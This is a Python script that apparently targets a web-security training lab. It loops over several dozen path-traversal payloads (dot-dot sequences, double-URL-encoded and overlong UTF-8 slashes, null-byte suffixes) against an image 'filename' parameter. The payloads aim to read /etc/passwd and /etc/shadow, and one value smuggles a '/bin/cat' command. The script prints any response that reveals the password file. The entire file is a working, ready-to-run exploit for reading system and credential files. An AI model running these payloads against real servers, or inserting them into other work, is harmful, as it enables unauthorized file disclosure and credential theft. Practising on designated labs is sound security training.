
import requests


payloads = [
	"/etc/passwd",
	"../../../../../../../../../../etc/passwd",
	"....//....//....//....//....//....//....//....//etc/passwd",
	r"..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
	r"..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
	r"../../../../../../../../../../etc/passwd%00.png"
]

payloads2 = r"""../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/shadow%00
../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../etc/passwd
/../../../../../../../../../../etc/shadow
/../../../../../../../../../../etc/passwd
/../../../../../../../../../../etc/shadow
/./././././././././././etc/passwd
/./././././././././././etc/shadow
\..\..\..\..\..\..\..\..\..\..\etc\passwd
\..\..\..\..\..\..\..\..\..\..\etc\shadow
..\..\..\..\..\..\..\..\..\..\etc\passwd
..\..\..\..\..\..\..\..\..\..\etc\shadow
/..\../..\../..\../..\../..\../..\../etc/passwd
/..\../..\../..\../..\../..\../..\../etc/shadow
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
..\..\..\..\..\..\..\..\..\..\etc\passwd%00
..\..\..\..\..\..\..\..\..\..\etc\shadow%00
%0a/bin/cat%20/etc/passwd
%0a/bin/cat%20/etc/shadow
%00/etc/passwd%00
%00/etc/shadow%00
%00../../../../../../etc/passwd
%00../../../../../../etc/shadow
/../../../../../../../../../../../etc/passwd%00.jpg
/../../../../../../../../../../../etc/passwd%00.html
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"""

temp = list(payloads2.split('\n'))

for i in temp:
	payloads.append(i)

bypass_filters =[
	"/",
	"../",
	r"..%252f",
	r"..%c0%af"
]


url = "https://acf81f971e59091ac0817f2900b10062.web-security-academy.net/image?filename="

filename = "/etc/passwd"
file_contents = "root:x:0"


for i in payloads:
	url2 = url + i

	r = requests.get(url2)

	if file_contents in r.text:
		print(url2)
		print(r.text)
		#break


